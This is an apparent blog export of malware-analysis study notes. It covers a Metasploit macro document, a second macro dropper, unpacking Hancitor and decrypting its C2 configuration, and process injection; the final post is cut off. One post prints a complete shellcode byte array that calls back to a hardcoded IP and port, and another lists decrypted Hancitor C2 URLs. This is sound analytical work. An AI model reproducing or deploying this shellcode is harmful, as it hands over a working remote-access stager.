{"meta":{"title":"zsky's Blog","subtitle":"","description":"某211研一在读|CTF_RE选手|tcl","author":"zsky","url":"https://zzzzsky.github.io","root":"/"},"pages":[{"title":"categories","date":"2021-11-18T14:36:52.000Z","updated":"2021-11-29T12:15:03.610Z","comments":true,"path":"categories/index.html","permalink":"https://zzzzsky.github.io/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-11-18T14:37:07.000Z","updated":"2021-11-29T12:15:24.996Z","comments":true,"path":"link/index.html","permalink":"https://zzzzsky.github.io/link/index.html","excerpt":"","text":""},{"title":"记录本fw的学习","date":"2021-11-18T14:37:07.000Z","updated":"2021-11-29T12:15:58.760Z","comments":true,"path":"about/index.html","permalink":"https://zzzzsky.github.io/about/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-11-18T14:36:30.000Z","updated":"2021-11-29T12:15:43.104Z","comments":true,"path":"tags/index.html","permalink":"https://zzzzsky.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"MAS系列-MDA2","slug":"MDA2","date":"2023-03-20T10:00:00.000Z","updated":"2023-03-20T12:09:50.168Z","comments":true,"path":"2023/03/20/MDA2/","link":"","permalink":"https://zzzzsky.github.io/2023/03/20/MDA2/","excerpt":"","text":"分析样本: 070281b8c1a72893182928c21bf7241a0ad8c95879969d5f58e28d08f1a73b55 ‍ 收集信息​ ​ ​ ​ 我们搜集到了以下信息 他是一个 **Microsoft Word 2007+**，所以它是一个zip container 它与特定的IP地址和端口通信：47.93.63.179:7498 它的家族是Metasploit 它可能有代码注入 这个样本可能会会把文件dumps到Windows目录 有嵌入的宏 分析使用zipdump.py分析文件 ​ 5(word/vbaProject.bin) 比较可疑，继续分析5 ​ 对象3是个宏，也是OLE文件中最大的对象。宏是以压缩的形式存储的，因此在读取其内容之前必须先解压缩 ​ ​ 直接SHIFT打开文件，ALT + F11查看宏 ​ 分析 ​ 这个代码像是Cobalt Strike / Metasploit 生成的代码 调用了CreateRemoteProcess(), VirtualAllocEx()和WriteProcessMemory() 证实了代码注入行为 有一个长度很大的数组，可能是ShellCode或者一个PE文件 编写一个简单的Python代码将ShellCode提取出来 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import structimport osmyArray = [-4, -24, -119, 0, 0, 0, 96, -119, -27, 49, -46, 100, -117, 82, 48, -117, 82, 12, -117, 82, 20, -117, 114, 40, 15, -73, 74, 38, 49, -1, 49, -64, -84, 60, 97, 124, 2, 44, 32, -63, -49, 13, 1, -57, -30, -16, 82, 87, -117, 82, 16, -117, 66, 60, 1, -48, -117, 64, 120, -123, - 64, 116, 74, 1, -48, 80, -117, 72, 24, - 117, 88, 32, 1, -45, -29, 60, 73, -117, 52, -117, 1, -42, 49, -1, 49, -64, -84, -63, -49, 13, 1, -57, 56, -32, 117, -12, 3, 125, -8, 59, 125, 36, 117, - 30, 88, -117, 88, 36, 1, -45, 102, -117, 12, 75, -117, 88, 28, 1, -45, -117, 4, -117, 1, -48, -119, 68, 36, 36, 91, 91, 97, 89, 90, 81, -1, -32, 88, 95, 90, -117, 18, - 21, -122, 93, 104, 110, 101, 116, 0, 104, 119, 105, 110, 105, 84, 104, 76, 119, 38, 7, -1, -43, 49, -1, 87, 87, 87, 87, 87, 104, 58, 86, 121, -89, -1, -43, -23, -124, 0, 0, 0, 91, 49, - 55, 81, 81, 106, 3, 81, 81, 104, 74, 29, 0, 0, 83, 80, 104, 87, -119, -97, -58, -1, -43, -21, 112, 91, 49, -46, 82, 104, 0, 2, 64, -124, 82, 82, 82, 83, 82, 80, 104, - 21, 85, 46, 59, -1, -43, -119, -58, -125, - 61, 80, 49, -1, 87, 87, 106, -1, 83, 86, 104, 45, 6, 24, 123, -1, -43, -123, -64, 15, -124, -61, 1, 0, 0, 49, -1, -123, -10, 116, 4, - 119, -7, -21, 9, 104, -86, -59, -30, 93, - 1, -43, -119, -63, 104, 69, 33, 94, 49, -1, -43, 49, -1, 87, 106, 7, 81, 86, 80, 104, -73, 87, -32, 11, -1, -43, -65, 0, 47, 0, 0, 57, - 57, 116, -73, 49, -1, -23, -111, 1, 0, 0, -23, -55, 1, 0, 0, -24, -117, -1, -1, -1, 47, 116, 97, 79, 56, 0, -21, 16, 49, -71, -117, 51, 127, -117, -33, 54, 31, -69, - 19, 48, 21, -37, -56, -107, -59, 23, -88, -63, 0, - 104, -116, -51, -104, 65, -48, -118, -80, 62, 123, -103, -51, -124, -11, -27, 50, 17, -77, -115, 98, 29, 106, -71, -108, 35, 99, -94, 70, 89, - 41, 14, -9, 114, -126, -101, -95, -16, - 75, 44, 28, 59, -70, 123, -27, 55, 63, -86, 8, 66, -3, 0, 85, 115, 101, 114, 45, 65, 103, 101, 110, 116, 58, 32, 77, 111, 122, 105, 108, 108, 97, 47, 52, 46, 48, 32, 40, 99, 111, 109, 112, 97, 116, 105, 98, 108, 101, 59, 32, 77, 83, 73, 69, 32, 55, 46, 48, 59, 32, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 54, 46, 48, 41, 13, 10, 0, 62, 73, 5, 8, - 70, 26, -68, 95, 117, -58, -111, -107, 21, 47, -40, -43, 89, 118, 112, -18, 17, 116, -104, 95, 44, -45, -100, -125, 106, 75, -7, -57, 92, - 90, -44, -128, -53, 22, -20, 101, 119, -65, - 69, -87, 29, 90, 118, 66, 24, 20, -60, 86, -86, -69, 89, 56, 15, 74, 78, 113, 44, 73, -16, -52, -119, 13, 5, -24, -71, -64, 127, -79, -61, -126, - 53, -105, -7, 76, -108, -60, -75, 41, -101, -61, - 14, -10, 65, 120, -70, -117, -120, 55, -110, 51, 94, -73, -52, 82, -66, 10, -103, -105, -92, 32, -44, 8, -88, 126, 14, 75, -29, -72, - 19, -87, 5, -61, 7, -109, -41, 23, -91, - 116, 41, 24, -84, -47, 6, -99, 110, -117, 78, -47, 1, -112, -55, 29, 110, 32, 30, -83, 107, -101, 65, 111, -73, 113, -100, 64, -117, -103, -117, - 30, 73, 102, 66, 76, -3, -51, 56, -66, -33, -73, - 2, -5, -116, 17, 71, 75, 39, 61, 69, -44, 48, 5, -28, 108, -42, -58, -116, -5, 112, 42, -91, -69, 30, -90, 46, -20, -50, -18, -37, -54, -125, - 27, 90, 30, 106, 62, -73, -88, 102, -113, 105, 116, 96, - 101, 73, -9, -15, -8, 20, -125, -63, -7, 15, -124, 49, 6, -61, -87, 24, -84, 72, -113, 38, 32, 0, -30, 5, 124, 52, 18, - 99, 46, 11, 56, -9, -14, 0, 104, -16, -75, - 94, 86, -1, -43, 106, 64, 104, 0, 16, 0, 0, 104, 0, 0, 64, 0, 87, 104, 88, -92, 83, -27, -1, -43, -109, -71, 0, 0, 0, 0, 1, - 39, 81, 83, -119, -25, 87, 104, 0, 32, 0, 0, 83, 86, 104, 18, -106, -119, -30, -1, -43, -123, -64, 116, -58, -117, 7, 1, -61, -123, -64, 117, -27, 88, -61, -24, -87, -3, -1, -1, 52, 55, 46, 57, 51, 46, 54, 51, 46, 49, 55, 57, 0, 18, 52, 86, 120]c = [x &amp; 0XFF for x in myArray]print(bytes(c))f = open(&quot;shellcode.bin&quot;, &quot;wb&quot;)for i in myArray: write_byte = struct.pack(&quot;&lt;b&quot;, i) f.write(write_byte)f.close() 010Editor打开分析，显然不是PE文件，应该是一个ShellCode ​ ‍ 可以用scdbg.exe去仿真执行 ​ 至此，分析结束 ‍","categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"MalwareAnalysis","slug":"MalwareAnalysis","permalink":"https://zzzzsky.github.io/tags/MalwareAnalysis/"},{"name":"恶意文档","slug":"恶意文档","permalink":"https://zzzzsky.github.io/tags/%E6%81%B6%E6%84%8F%E6%96%87%E6%A1%A3/"}]},{"title":"MAS系列-MDA1","slug":"MDA1","date":"2023-03-17T10:00:00.000Z","updated":"2023-03-17T10:29:17.344Z","comments":true,"path":"2023/03/17/MDA1/","link":"","permalink":"https://zzzzsky.github.io/2023/03/17/MDA1/","excerpt":"","text":"分析的样本： 59ed41388826fed419cc3b18d28707491a4fa51309935c4fa016e53c6f2f94bc 下载样本和收集信息​ 分析恶意文档通过malwoverview的输出，可以看到恶意文档可能会释放出exe，然后提升权限，HOOK，进程注入等操作。 使用olevba和oleid来收集更多的信息 ​ ​ 从这2个图可以分析出一些事实 当MS Word被执行的时候，一些代码被执行了 一个文件可能被写入 maldoc可能打开了一个文件 VBA宏负责整个活动 使用OLEDUMP分析 ​ 发现，有3个宏，16,17,18 在第11处有大量的数据，猜测是一个VBA resources，可能是加密的资源 ​ 从上面的输出中可以观察到一些细节 很显然，代码被混淆了 split函数返回一个一维数组，它处理UserForm1中的内容，这些内容被分为了4部分，UserForm1内容似乎用!字符分割 UserForm2正在进行MoveFile操作 Winmgmt服务是在LocalSystem帐户下的svchost进程内操作的WMI服务，用于执行UserForm2.TextBox5给定的操作。 UserForm2.Text 6用于创建对ActiveX提供的对象的引用。 UserForm2.Text 7用于保存内容到二进制文件中 ​ 所以 UserForm2.Text1: C:\\Users\\Public\\Pictures\\winword.con UserForm2.Text2: C:\\Users\\Public\\Pictures\\winword.exe UserForm2.Text3: ​Scripting.FileSystemObject UserForm2.Text4: ​winmgmts:{impersonationLevel=impersonate}!&quot; &amp; strComputer &amp; “\\root\\cimv2} UserForm2.Text5: ​Win32_ProcessStartup UserForm2.Text6: ​winmgmts:root\\cimv2:Win32_Process UserForm2.Text7: ​ADODB.Stream ​ 所以程序执行了这个winword.exe，而这个程序的二进制数据保存在Macros/UserForm1/o(11)中 先将其数据保存下来 ‍ ​ ​ 将里面的Tahoma去掉，然后写脚本拼接即可 12345678910111213141516import osfilename = &quot;./1233.txt&quot;f = open(filename, &#x27;r&#x27;, encoding=&quot;utf-8&quot;)c = f.read()data_array = c.split(&quot;!&quot;)f.close()data_array = [int(i) for i in data_array]data_array_bytes = bytes(data_array)f = open(&quot;download.bin&quot;, &quot;wb&quot;) f.write(data_array_bytes)f.close()print(&quot;Write Success!!&quot;) ‍ ​ ​ ​ ​ 可以通过动态调试更容易的从DOCX文件中提取数据。打开的时候，VBS是加密的，用记事本打开，将DPB改为DPX即可 ​ ​ ​","categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"MalwareAnalysis","slug":"MalwareAnalysis","permalink":"https://zzzzsky.github.io/tags/MalwareAnalysis/"},{"name":"恶意文档","slug":"恶意文档","permalink":"https://zzzzsky.github.io/tags/%E6%81%B6%E6%84%8F%E6%96%87%E6%A1%A3/"}]},{"title":"MAS系列1","slug":"MAS系列1","date":"2023-03-16T01:58:00.000Z","updated":"2023-03-16T10:38:45.860Z","comments":true,"path":"2023/03/16/MAS系列1/","link":"","permalink":"https://zzzzsky.github.io/2023/03/16/MAS%E7%B3%BB%E5%88%971/","excerpt":"","text":"MAS系列网址：https://exploitreversing.com/ 分析样本哈希（SHA256）：8ff43b6ddf6243bd5ee073f9987920fa223809f589d151d7e438fd8cc08ce292 ‍ 脱壳相关概念加壳的动机 便于逃避AV的检测 由于需要规避许多反分析技术（反调试器和反vm技巧），因此很难对其进行动态脱壳 整个恶意软件或只有脱壳的代码可是多态的 大多数恶意软件使用自定义的壳，使代码在安全防御监控下无法检测到。另外还有一些特殊的加壳程序（也称为保护程序），例如Themida，Arxan, VMProtect, Agile.NET和许多其他的会虚拟化指令并实施各种反取证和混淆技术的加壳程序，下面是他们的一些特征 已用于64位二进制文件 IAT被去除或者最多导入一个函数 大多数字符串被加密 内存完整性受到检查和保护，因此无法从内存中dump出原始原始程序，因为原始指令并没有解码 指令被虚拟化，并且有的转换为RISC指令 虚拟指令在内存中被加密 使用基于堆栈的混淆，使用静态的方法处理虚拟化指令是非常困难的 大多数虚拟指令是多态的，因此有许多虚拟指令引用同一原始指令 有非常多假的push指令，当然，其中包含许多死代码（dead code）和无用代码（useless code）。 这些保护程序使用无条件跳转实现代码重新排序 所有的这些现在的加壳器使用代码平坦化，许多反调试技术，和反虚拟机技术 并非所有 x64 指令都是虚拟化的，因此会发现包含虚拟化和非虚拟化（原生）指令混合的二进制代码 大多数时候，函数的序言（prologues）和尾部（epilogues）并没有虚拟化。 原始代码段（code section）可以被拆分或分散在程序中，所以指令和数据可能会混合在一起。 引用导入函数的指令可能会被清零或被NOP替换，这种情况下，这些引用会动态恢复。有时相同的引用不会被清零，而是替换为使用 RVA 跳转到相同导入地址的跳转指令，正如有名的“IAT 混淆”。 在 shellcode 和常见的恶意软件中使用的 API 是经过 hash 处理的。 从原生寄存器（native register）到虚拟寄存器（virtualized register）的转换通常是一对一的，但也并非总是如此。此外，还有一个上下文切换组件，负责将寄存器和标志信息转移到虚拟机上下文。 虚拟机处理函数（handlers）来自数据段 许多原生（native）API 被重定向到桩代码（stub code）来转发函数调用 例如常量展开（constant unfolding）、基于模式的混淆（pattern-based obfuscation）、间接跳转（control indirection）、内联函数（inline function）、代码重用（code duplication）以及不透明谓词（opaque predicate）等混淆被经常使用。 在脱壳之前或脱壳时，我们可以观察并考虑以下问题： 恶意软件真的加壳了吗 加壳的证据 恶意软件是否执行了自我注入或者远程注入 恶意软件是否执行了自我覆盖 Payload被写在哪里 Payload如何被执行 怎么证明脱壳完毕 是否存在多层加壳 我们如何知道恶意软件是否真的加壳？有2，3个点可以证明这件事情 二进制样本只有几个导入的DLL和函数 有许多混淆的字符串 存在特殊的系统调用 非标准 段名字 没有通用的可执行段（只有.text/.code段可以被执行） 额外的可写段 高熵（High entropy）段（高于7.0，但只能作为一个弱指标） 段的原始大小和虚拟大小存在实质性的差异 大小为0的段 没有与网络通信的相关API 缺少恶意软件功能的必要API（比如勒索软件中的Crypt*函数） 不寻常的文件格式和文件头 程序入口点执行其他的段，而不是.text/.code段 特别大的资源端被LoadResource()加载 多层加壳的出现 在IDA Pro上打开后在彩条上看到大量的数据或者未探索的代码 仅仅出现1个并不能确定加壳，出现多个就基本上可以确定加壳了，此外，还有一些其他的因素可以考虑 大多数样本使用LoadLibrary() 和GetProcAddress()动态解析API（反射性代码注入除外） 网络APIS也可能被动态解析 在第一次分析时很难检测到不正确的标头 大的资源段可能不是壳，因为其可能仅包含GUI控件或者数字证书 可能会混合使用加密/混淆字符串和明文，因此很难确定二进制文件是否加壳 使用调试器脱壳可能有一系列需要理解和绕过的挑战 反调试技术（时间检查【time checking】、CPUID、堆检查【heap checking】、调试标志位检查【debugging flag checking】、NtSetInformationThread()等），所以推荐在 x64dbg/x32dbg 使用 ScyllaHide 等反调试插件。 反虚拟机技术用于检查 VMware，VirtualBox，Hyper-V 和 Qemu 工件。 文件名，主机名以及用户检查（避免使用哈希作为文件名）。 虚拟机上可用磁盘大小（推荐至少 100 GB）。 虚拟机上的处理器数量（两个或更多）。 正常运行时间（尝试保持正常运行时间超过20分钟） 许多无意义的调用（不会使用返回结果）和不存在的 API（假 API）。 异常处理被用于反调试。 软件断点被清除以及寄存器（DR#）被操控（反断点技术）。 使用经典算法（crc32，conti，add_ror13…）的哈希函数。 Process Hacker、Process Explorer、Process Monitor 等知名工具的检查（建议在使用前重命名这些可执行文件）。 不幸的是，反虚拟机技术和反调试技术不可能总被插件处理，我们必须设法使用调试器绕过。在这种情况下，我们可以使用 WinDbg 等不同的调试器来调试恶意软件（这些恶意软件只针对 ring3 调试器，不针对内核调试器，如 GuLoader ​恶意软件）。 ‍ 在脱壳后，我们也可能需要修复生成的二进制文件，因为可能存在以下问题 DOS/PE头可能已在内存中破坏或者被压缩库修改 许多情况下，当从内存中提取二进制文件时，需要清理它，因为在它的 DOS 头（MZ 签名）和 PE 头之前有一些垃圾字节 入口点（Entry-Point，EP）可能被清零或错误。 脱壳后二进制文件的导入表可能被破坏，因为内存被转储为文件，但其地址指的是虚拟地址（映射版本而非未映射版本），因此显示的地址为未对齐段或不存在的段。 基地址是错误的 PE格式的字段存在一些不一致 可能很难确定原始入口点（Original Entry Point，OEP），它通常使用间接调用（如call [eax]或jmp [eax]）完成脱壳器代码到原代码的转换。另外，未解析 API 的存在可能是恶意代码尚未到达 OEP 的证据。注意：OEP 是可执行文件在加壳之前的入口点，在加壳之后，一个新的 EP 与加壳器相关联 互斥锁（mutexes）被用于两层脱壳器之间的一个“解锁密钥”。这种情况下，在没有第一阶段发生的情况下第二阶段的脱壳是不会发生的，如果发生了，则证明互斥锁的存在。 代码可能执行自我覆盖 脱壳代码的第一阶段不会从任意目录运行，只能从特定目录运行。 你可以提取诱饵二进制文件（decoy binary），在许多案例中，恶意软件开发者会打包一个或多个无用的可执行文件作为诱饵，以此来消耗分析人员的时间，因此，明智的做法是不要相信第一次就从内存中得到了脱壳后正确的二进制文件 下面是一些解决这些问题的办法： 从另一个可执行文件（或从样本自身）复制一个完整的 PE 头，并考虑脱壳后的二进制文件是未映射（.text 段通常从 0x400 开始）还是映射的（.text 段通常从 0x1000 开始）。 通过修改相应的原始地址（Raw Address）和原始大小（Raw Size）来对齐脱壳后二进制文件的段，此操作通常会修复导入表，并且可能会查看到导入函数。需要注意：一些脱壳后的二进制文件在对齐它们的段之前是不会显示导入表的。然而，还有一些恶意软件在你脱壳之后导入表依旧没有任何函数，这并不意味你的脱壳过程出错，而是可能使用了动态解析 API 的技术。 重建 IAT 并强制修改 OEP。 如果在查找 OEP 时遇到了问题，请记住 OEP 可能在 IAT 解析之后出现。这种情况下，一种可能的方法是检查 IAT 是否已解析（检查 x64dbg 上的模块间调用）或在恶意软件执行时的关键 API 上设置断点（例如勒索软件使用的CryptoAcquireContext()），因为当执行到这些关键 API 时，IAT 肯定已经完成了解析，然后寻找无条件跳转到特定内存或间接调用（如call [eax]）。另一种有趣的方法是使用调试器的图形可视化功能（x64dbg 中的 g），并在最后的代码块检查这些转换点（间接调用或内存地址的无条件跳转） 调整基地址以匹配从内存转储的段基地址 为了检测执行自我覆盖的恶意软件，可以尝试在 .text/.code 段设置断点，这样可以在代码段被写或执行时触发断点。 在两阶段脱壳情况下，第一个脱壳得到的二进制文件可能是 DLL，根据上下文将 DLL 文件转换为可执行文件可能很有用，并且有很多方法可以完成此任务，但我最喜欢的方法是编辑 PE 头以更改Characteristics 字段，并将导出函数的入口作为程序入口。 ‍ 代码注入技术回顾主要的代码技术有以下几种 DLL 注入: 这个老的技术用来强制一个进程加载一个DLL， 主要涉及到的APIs： OpenProcess()​, VirtualAllocEx()​,WriteProcessMemory()​,CreateRemoteThread | NtCreateThread | RtlCreateUserThread​ PE 注入: 在这种技术中，编写恶意代码强制在远进程或自我进程中（自我注入）执行，OpenThread()​,SuspendThread()​,VirtualAllocEx()​,WriteProcessMemory()​,SetThreadContext()​,ResumeThread() | NtResumeThread()​。 Reflective Injection APC Injection Process Hollowing: 简而言之，该技术被恶意软件用来 ”挖空”进程的全部内容，并在其中插入恶意内容。包含的APIs有：CreateProcess()​, NtQueryProcessInfomation​, GetModuleHandle()​, Zw/NtUnmapViewOfSection()​,VirtualAllocEx()​,WriteProcessMemory()​, GetThreadContext()​ AtomBombing Process Doppelgänging Process Herpaderping Hooking Injection Extra Windows Memory Injection Propagate Injection （没写详细的就是遗忘的或者没接触过的，之后再补 ​ 脱壳方法脱壳的分类非常复杂，这部分主要讲述脱壳技术，但是一般来说，有一些方法能够对恶意软件进行脱壳，例如使用调试器、自动化工具、Web服务或者编写自己的脱壳代码，具体使用哪种方法根据情况而定​ 调试器 + 特定函数断点脱壳这是使用最多的方法是，包括将恶意软件加载到调试器中，并在众所周知的API上设置软件断点，其中大多数与内存管理和操作有关，并查找要从内存中提取的可执行文件和ShellCode,在以下API上插入软件断点: CreateProcessInternalW() VirtualAlloc() | VirtualAllocEx() VirtualProtect() | ZwProtectVirtualMemory() WriteProcessMemory() | NtWriteProcessMemory() ResumeThread() | NtResumeThread() CryptDecrypt() | RtlDecompressBuffer() NtCreateSection() + MapViewOfSection() | ZwMapViewOfSection() UnmapViewOfSection() | ZwUnmapViewOfSection() NtWriteVirtualMemory() NtReadVirtualMemory() 脱壳过程中，我们可能会遇到一些问题（例如，恶意软件使用了反调试技术）和其他困难。因此，下面有一些在脱壳前和脱壳后需要注意的： 在恶意软件到达其入口点后设置断点（系统断点后） 如前所述，建议使用反调试插件，并在少数情况下忽略从 0x00000000 到 0xFFFFFFFF 范围的所有异常 有时忽略异常可能不是一个好主意，因为恶意软件可能使用异常来脱壳，另外，还存在使用中断和异常调用 API 的恶意软件（本文之外） 使用 MSDN 了解列出的 API 以及参数是成功脱壳恶意软件的关键。 如果使用VirtualAlloc()，建议在其退出时（ret 10）设置断点，此外，有时通过设置写内存断点更容易跟踪分配的内容。 某些情况下，恶意软件将 payload 提取到内存中，但它会破坏 PE 头，因此需要使用 HxD 等十六进制编辑器重建整个 PE 头 提取的 payload 可能采用映射或未映射的格式。如果是映射格式，那可能导入表是损坏的，需要通过 PEBear 手动对齐段，或者使用 pe_unmapper 之类的工具进行修复，可能还需要修复基地址和入口点。 要重建损坏的 IAT，建议使用 Scylla（内嵌在 x64dbg），但需要输入 OEP，找到 OEP 的方法之一是查找代码转换的指令（如jmp eax，call eax，call [eax]等）。 一些脱壳后的恶意软件在 IAT 中没有任何函数，所以有两种可能：段未对齐（映射版本）或是脱壳后的恶意软件有动态解析函数的功能。 在 x64dbg 上使用 g 键可能有助于在块中可视化代码，并找到可能的 OEP。 查找 OEP 的另一个方法是通过 PIN 等代码跟踪工具。 tiny_tracer 之类借助 PIN 的工具可以更轻松地检测，并且可用于了解恶意软件调用的函数（对于脱壳和了解反分析技术非常有用），还能寻找可能的 OEP。 在许多情况下，脱壳后的代码可能是恶意软件的第一阶段，因此，有必要重复步骤来对下一阶段脱壳。 一些恶意软件样本执行自我覆盖，因此可以在 .text 段设置断点来检测脱壳的执行。 根据提取的二进制文件（如 shellcode），它可能需要特定的上下文环境才能运行，因此有必要将其注入正在运行的进程（如 explorer.exe）中执行进一步的分析。 如何检查提取的文件是否是最终的恶意软件？这里没有一个准确的答案，通过从 DLL 如 WS2_32.dll（Winsock）和 Wininet.dll 查找网络函数，明文字符串，加密函数（主要是勒索软件），以及其他证据来判断。在重新对齐段或修复 IAT 之后，可以将提取到的代码加载到 IDA Pro 进行分析。 调试器 + DLL加载时断点这是一种古老且简单的恶意软件脱壳技术，方法是在每个加载的 DLL 时停止调试器并检查内存中可能提取的 PE 格式文件的内存（注意：不要只关注 RWX 段，因为许多恶意软件会在 RW 段，并且在将执行上下文传递到可执行文件前，会通过VirtualProtect()将段的权限更改为 RWX）。毫无疑问，虽然会消耗一些时间，但大多数情况下十分有效。x64dbg 有配置选项中可以设置每个 DLL 加载时命中断点（Options =&gt; Debugging Options =&gt; Events =&gt; DLL load）。 自动脱壳恶意软件分析人员可以使用自动化工具完成脱壳，Aleksandra Doniec (Hasherezade) 提供了出色的工具来实现这一目标： hollows-hunter：https://github.com/hasherezade/hollows_hunter/releases pe-sieve：https://github.com/hasherezade/pe-sieve/releases mal_unpack：https://github.com/hasherezade/mal_unpack/releases 使用Process Hacker另一种从内存中提取二进制文件的简单（且有局限性）方法是通过 Process Hacker，方法是双击正在运行的进程，转到 Memory 选项，查找感兴趣的区域或基地址（RWX），双击并保存。当然，在自我注入的情况下更容易找到恶意二进制文件或 payload。但远程注入的情况下，需要逆向恶意程序来了解要注入的目标进程，诸如 explorer.exe 或 svchost.exe 等目标。重申一次，这是一种简单且有限的方法。 使用公开或付费的服务你可以使用互联网上的服务 Unpacme，它提供自动脱壳服务，有一个免费的公共计划（每月 10 次）和其他付费计划。此外，它还提供了一个 API（https://api.unpac.me/）来将你的自定义程序与 Unpacme 服务连接 写脱壳代码尽管这种方法听起来比较耗时，通常可以使用 Python 完成脱壳，主要是在 shellcode 或 处理恶意软件线程使用多种反虚拟机和反调试的情况中。此外，在处理类似恶意软件时，还具有自动脱壳的优势。 二进制脱壳分析样本： 8ff43b6ddf6243bd5ee073f9987920fa223809f589d151d7e438fd8cc08ce292 首先使用PEBear进行检查，可能有助于收集第一批有价值的信息 发现在IAT中并没有关于网络通信，加解密的API，所以猜测加壳了。 .data段的VirtualSize远远大于RawSize，而且这个段的属性是可写的，这是另一个加壳的标记。 开始脱壳，在下面这些经典函数处下断点 VirtualAlloc VirtualProtect ResumeThread 经过几次CTRL + F9，观察VirtualAlloc分配的内存处的数据，发现了M8Z，这是一个aPLib压缩，直接dump下来 搜索MZ头，发现已经解压缩完了，然后将MZ之前的去掉，拖到CFF Explorer里 可以看到很多加解密的函数，以及网络通信的函数，到这里位置，第一步的Unpack就结束了 逆向解密代码现在我们有了解压缩的二进制文件，所以让我们在IDA Pro中打开它。有很多方法可以找到加密配置，但更简单(而且有点不准确)的方法之一是在IDA Pro上查找处理数据的函数或Unexplored 颜色条区域(实际上，未探索的区域比下面所示的要大得多)： ‍ byte_10004000 byte_10004010 byte_10004018 根据我分析恶意软件的经验，我已经知道4010这块局域的8字节是Microsoft Crypto API中几个API的重要依据，因此这表明我们分析对了，在许多著名的恶意软件样本中发现的另一种模式是struct key + encrypted data，所以即使我没有关于这种情况的任何进一步指示，我也可以假设“byte_10004010”是某个密钥（长度为 8 字节），尽管 有时它不是最终密钥，因为恶意威胁使用 KDF（Key Derivation Functions）从提供的密码生成最终密钥。 根据我们的分析，“unk10004018”指的是可能加密的数据。 这些都只是猜测，只有去分析过之后，才会对这个位置的数据有一个更好的了解。 来到交叉引用的函数的位置 尽管CryptAcquireContextA()​是一个被遗弃的函数，但他仍然被恶意软件威胁广泛使用。此API用于通过CSP（加密服务提供程序）获取密钥容器的句柄，它使用默认的密钥容器名称和用户默认的提供程序，因为这两个参数都为零，看第5个参数，0XF0000000指的是 CRYPTO_VERIFYCONTEXT​ ，这在使用临时密钥或不需要访问永久私钥的应用程序中很常见。这个恶意样本正在使用密钥派生。 ​ 所以加密的步骤为 byte_10004010 = C58B00157F8E9288 byte_10004010 –&gt;SHA1(20bytes) SHA1 → CryptHashData( ) → CryptDeriveKey( ) → RC4 key (5 bytes) 写解密代码解密数据 1234567891011121314151617181920212223242526272829303132333435363738import binasciiimport pefilefrom Crypto.Cipher import ARC4from Crypto.Hash import SHAdef extract_data(filename): pe = pefile.PE(filename) for section in pe.sections: if &quot;.data&quot; in section.Name.decode(encoding=&quot;utf-8&quot;).strip(): return section.get_data(section.VirtualAddress, section.SizeOfRawData)def data_decryptor(rc4key, encrypt_config): rc4_cipher = ARC4.new(rc4key) decrypted_config = rc4_cipher.decrypt(encrypt_config) return decrypted_configdef main(): file_name = &#x27;./_004B0000.mem&#x27; datasec = extract_data(file_name) datasec2 = datasec[16:] key = datasec2[:8] # KEY encrypted_data = datasec2[8:256] hashed_key = SHA.new(key).hexdigest() true_key = hashed_key[:10] dec_data = data_decryptor(binascii.unhexlify(true_key), encrypted_data) print(&quot;解密数据如下: &quot;) print(dec_data.decode(&quot;utf-8&quot;))if __name__ == &#x27;__main__&#x27;: main()# 解密数据如下: # 1910_nswhttp://newnucapi.com/8/forum.php|http://gintlyba.ru/8/forum.php|http://stralonz.ru/8/forum.php| 我们设法从unpack的Hancitor二进制文件中提取并解密了Hanitor C2配置。编写解密器脚本的优点是，我们可以对所有遵循二进制模式的Hanctors样本使用它 使用malwoverview去查找一些其他的Hancitor样本。 ​ 随便找一个下载下来，利用相似的方式脱壳，即在VirtualAlloc上下断点 ​ 发现这里有MZ头，dump下来后，去除前面那部分，然后打开IDA ‍ ​ 发现是相同的结构，用之前的脚本提取下 12解密数据如下: 2103_punoshhttp://nanogeelr.com/9/forum.php|http://ockpitehou.ru/9/forum.php|http://lumentsawfu.ru/9/forum.php| 发现解密成功，然后好奇用bindiff对比以下上面2个样本unpack后的样本 ‍ ​ 发现基本一模一样,另外解密过程也可以用网站 https://gchq.github.io/CyberChef/ ‍ 总结在这一篇文章中，我展示了如何通过编写Python3脚本从Hancitor样本中提取和解密C2数据，此外我还介绍了一些概念和基础，如代码注入和脱壳，这些概念和基础将在本系列的下一篇文章中有用。","categories":[{"name":"读书笔记","slug":"读书笔记","permalink":"https://zzzzsky.github.io/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"MalwareAnalysis","slug":"MalwareAnalysis","permalink":"https://zzzzsky.github.io/tags/MalwareAnalysis/"},{"name":"脱壳","slug":"脱壳","permalink":"https://zzzzsky.github.io/tags/%E8%84%B1%E5%A3%B3/"},{"name":"进程注入","slug":"进程注入","permalink":"https://zzzzsky.github.io/tags/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"}]},{"title":"《Mastering Malware Analysis》第五章","slug":"Mastering_Malware_Analysis_Chapter_5","date":"2023-03-03T01:58:00.000Z","updated":"2023-03-03T01:58:34.839Z","comments":true,"path":"2023/03/03/Mastering_Malware_Analysis_Chapter_5/","link":"","permalink":"https://zzzzsky.github.io/2023/03/03/Mastering_Malware_Analysis_Chapter_5/","excerpt":"","text":"Mastering Malware Analysis Chapter 5 Inspecting Process Injection and API Hooking 我们将深入研究各种进程注入技术，包括DLL注入和傀儡进程(Stuxnet引入的一种先进技术)，并解释如何处理它们。然后将学习API hook, IAT hook和其他的hook技术 您将学习如何分析其他进程中注入的代码，通过内存取证检测它，检测不同类型的API钩子技术，并分析它们以检测**Man-in-the-Browser(MiTB)**攻击 为了使学习无缝衔接，这个章节被划分为下面几个主要的部分 理解进程注入 DLL注入 深挖进程注入 代码注入的动态分析 针对进程注入的内存取证技术 理解API hook 探索IAT hook 理解进程注入什么是进程注入?进程注入是一组技术，允许您将代码块或整个动态链接库(dll)注入到另一个进程的内存中，并执行该代码。 在Windows 